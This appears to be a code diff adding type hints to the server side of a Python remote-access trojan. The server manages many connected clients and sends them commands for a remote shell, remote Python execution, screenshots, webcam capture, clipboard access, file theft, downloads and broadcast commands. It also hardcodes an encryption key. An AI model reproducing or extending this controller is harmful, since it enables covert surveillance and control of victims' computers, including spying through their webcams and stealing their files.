@@ -46,7 +46,7 @@ MENU_HELP = """--h | See this Help Message
 --s | Shutdown Server"""
 
 
-def read_file(path, block_size=32768) -> bytes:
+def read_file(path: str, block_size: int = 32768) -> bytes:
     """ Generator for reading files """
     with open(path, 'rb') as f:
         while True:
@@ -57,7 +57,7 @@ def read_file(path, block_size=32768) -> bytes:
                 return
 
 
-def errors(ERROR, line=True) -> str:
+def errors(ERROR: Exception, line: bool = True) -> str:
     """ Error Handler """
     error_class = ERROR.__class__.__name__
     error_msg = f'{error_class}:'
@@ -73,7 +73,7 @@ def errors(ERROR, line=True) -> str:
     return error_msg
 
 
-def shell_print(data) -> None:
+def shell_print(data: bytes) -> None:
     """ Support for printing more characters """
     # Mostly for tree command in Windows
     try:
@@ -92,25 +92,25 @@ def _time() -> str:
     return f"{datetime.now()}".replace(':','-')
 
 
-def json_dumps(data) -> bytes:
+def json_dumps(data: not bytes) -> bytes:
     """ Dump json data and encode it """
     return json.dumps(data).encode()
 
 
-def json_loads(data):
+def json_loads(data: bytes):
     """ Decode data and json load it """
     return json.loads(data.decode())
 
 
 class Client(object):
 
-    def __init__(self, conn, address, key) -> None:
+    def __init__(self, conn: socket.socket, address: list, key: bytes) -> None:
         self.conn = conn
         self.address = address
         self.key = key
         self.fer = Fernet(key)
 
-    def recvall(self, n) -> bytes:
+    def recvall(self, n: int) -> bytes:
         """ Function to receive n amount of bytes"""
         # returns bytes/None
         data = b''
@@ -128,7 +128,7 @@ class Client(object):
         self.conn.send(b'RECEIVED')
         return self.fer.decrypt(self.recvall(buffer))
 
-    def send(self, data) -> None:
+    def send(self, data: bytes) -> None:
         """ Send Buffer Size and Data to Client """
         # returns None
         encrypted = self.fer.encrypt(data)
@@ -160,13 +160,13 @@ class Client(object):
         self.send(json_dumps(['PASTE']))
         return tuple(json_loads(self.receive()))
 
-    def fill_clipboard(self, data) -> (bool, str):
+    def fill_clipboard(self, data: str) -> (bool, str):
         """ Copy to Client Clipboard"""
         # returns True/False, None/error
         self.send(json_dumps(['COPY', data]))
         return tuple(json_loads(self.receive()))
 
-    def download(self, url, file_name) -> (bool, str):
+    def download(self, url: str, file_name: str) -> (bool, str):
         """ Download File To Client """
         # returns True/False, None/error
         self.send(json_dumps(['DOWNLOAD', url, file_name]))
@@ -177,7 +177,7 @@ class Client(object):
         self.send(json_dumps(['LOG_FILE']))
         return self.receive().decode()
 
-    def get_log(self, save_as=None) -> str:
+    def get_log(self, save_as: str = None) -> str:
         """ Transfer log to Server """
         # save_as: file name
         if not save_as:
@@ -231,7 +231,7 @@ class Client(object):
         self.send(json_dumps(['RESTART']))
         return json_loads(self.receive())
 
-    def send_file(self, file_to_transfer, save_as) -> None:
+    def send_file(self, file_to_transfer: str, save_as: str) -> None:
         """ Send file from Server to Client """
         # returns True/False, None/error
         self.send(json_dumps(['SEND_FILE', save_as]))
@@ -246,7 +246,7 @@ class Client(object):
         self.receive()
         return True, None
 
-    def receive_file(self, file_to_transfer, save_as) -> None:
+    def receive_file(self, file_to_transfer: str, save_as: str) -> None:
         """ Transfer file from Client to Server """
         # returns True/False, None/error
         self.send(json_dumps(['RECEIVE_FILE', file_to_transfer]))
@@ -264,7 +264,7 @@ class Client(object):
         self.receive()
         return True, None
 
-    def screenshot(self, save_as=None) -> (bool, str):
+    def screenshot(self, save_as: str = None) -> (bool, str):
         """ Take screenshot on Client """
         # returns True/False, None/error
         if not save_as:
@@ -278,7 +278,7 @@ class Client(object):
             f.write(data)
         return True, save_as
 
-    def webcam(self, save_as=None) -> (bool, str):
+    def webcam(self, save_as: str = None) -> (bool, str):
         """ Capture webcam """
         # returns True/False, save_as/None
         if not save_as:
@@ -291,13 +291,13 @@ class Client(object):
             f.write(data)
         return True, save_as
 
-    def exec(self, command) -> (str, str):
+    def exec(self, command: str) -> (str, str):
         """ Remote Python Interpreter """
         # returns command_output, error/None
         self.send(json_dumps(['EXEC', command]))
         return tuple(json_loads(self.receive()))
 
-    def shell(self, command, _print=True) -> (str, str):
+    def shell(self, command: str, _print: bool = True) -> (str, str):
         """ Remote Shell with Client """
         # returns command_output
         system = self.get_platform()
@@ -365,7 +365,7 @@ class Client(object):
         self.send(json_dumps(['_INFO']))
         return tuple(json_loads(self.receive()))
 
-    def info(self, _print=True) -> str:
+    def info(self, _print: bool = True) -> str:
         """ Get Client Info """
         # returns str
         self.send(json_dumps(['INFO']))
@@ -374,19 +374,19 @@ class Client(object):
             print(info)
         return info
 
-    def zip_file(self, zip_filename, file_to_zip) -> (bool, str):
+    def zip_file(self, zip_filename: str, file_to_zip: str) -> (bool, str):
         """ Zip a Single File """
         # returns True/False, None/error
         self.send(json_dumps(['ZIP_FILE', zip_filename, file_to_zip]))
         return tuple(json_loads(self.receive()))
 
-    def zip_dir(self, zip_filename, dir_to_zip) -> (bool, str):
+    def zip_dir(self, zip_filename: str, dir_to_zip: str) -> (bool, str):
         """ Zip a Directory """
         # returns True/False, None/error
         self.send(json_dumps(['ZIP_DIR', os.path.splitext(zip_filename)[0], dir_to_zip]))
         return tuple(json_loads(self.receive()))
 
-    def unzip(self, zip_filename) -> (bool, str):
+    def unzip(self, zip_filename: str) -> (bool, str):
         """ Unzip a File """
         # returns True/False, None/error
         self.send(json_dumps(['UNZIP', zip_filename]))
@@ -395,7 +395,7 @@ class Client(object):
 
 class MultiServer(object):
 
-    def __init__(self, port, key=b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=') -> None:
+    def __init__(self, port: int, key: bytes) -> None:
         self.host = ''
         self.port = port
         self.socket = None
@@ -425,7 +425,7 @@ class MultiServer(object):
             self.socket_bind()
         return
 
-    def accept_connections(self, _print=False) -> None:
+    def accept_connections(self, _print: bool = False) -> None:
         """ Accepts incoming connections and agrees on a AES key using RSA"""
         while 1:
             try:
@@ -444,7 +444,7 @@ class MultiServer(object):
             except Exception as e:
                 logging.debug(errors(e))
 
-    def del_client(self, client) -> None:
+    def del_client(self, client: Client) -> None:
         try:
             self.clients.remove(client)
             client.conn.close()
@@ -469,7 +469,7 @@ class MultiServer(object):
             print('   '.join(map(str, (i, ) + client.address)))
         return
 
-    def get_target(self, cmd) -> socket.socket:
+    def get_target(self, cmd: str) -> socket.socket:
         """ Select target client """
         # returns Client Object
         target = cmd.split(' ')[-1]
@@ -481,7 +481,7 @@ class MultiServer(object):
         print(f"You are now connected to {client.address[2]}")
         return client
 
-    def python_interpreter(self, client) -> None:
+    def python_interpreter(self, client: Client) -> None:
         """ Remote Python Interpreter CLI"""
         # returns None
         print('CAUTION! Using this feature wrong can break the client until restarted.')
@@ -497,7 +497,7 @@ class MultiServer(object):
             if output != '':
                 print(output, end='')
 
-    def shell(self, client) -> None:
+    def shell(self, client: Client) -> None:
         """ Remote Shell Interface """
         # returns None
         system, home, user = client._get_info()
@@ -518,7 +518,7 @@ class MultiServer(object):
                 break
             client.shell(command)
 
-    def selector(self, client, command) -> bool:
+    def selector(self, client: Client, command: str) -> bool:
         """ Command selector interface """
         # returns True/None
         commands = command.lower().split(' ')
@@ -682,7 +682,7 @@ class MultiServer(object):
         else:
             print("Invalid command: '--h' for help.")
 
-    def broadcast(self, command) -> None:
+    def broadcast(self, command: str) -> None:
         """ Broadcast a command to all connected Clients """
         # returns None
         clients = self.clients[:]
@@ -693,7 +693,7 @@ class MultiServer(object):
             except Exception as e:
                 print(errors(e))
 
-    def interface(self, client) -> None:
+    def interface(self, client: Client) -> None:
         """ CLI to Client """
         # returns None
         ip = client.address[0]
@@ -740,7 +740,7 @@ class MultiServer(object):
                 print(errors(e))
 
 
-def accept_conns(server) -> None:
+def accept_conns(server: MultiServer) -> None:
     """ Function to accept connections """
     # Returns None
     server.socket_create()
@@ -749,7 +749,7 @@ def accept_conns(server) -> None:
     return
 
 
-def accept_thread(server) -> None:
+def accept_thread(server: MultiServer) -> None:
     """ Runs function to accept connections in thread """
     # Returns None
     t = threading.Thread(target=accept_conns, args=(server,))
@@ -759,6 +759,6 @@ def accept_thread(server) -> None:
 
 
 if __name__ == '__main__':
-    server = MultiServer(8000)
+    server = MultiServer(8000, b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=')
     accept_thread(server)
     server.menu()
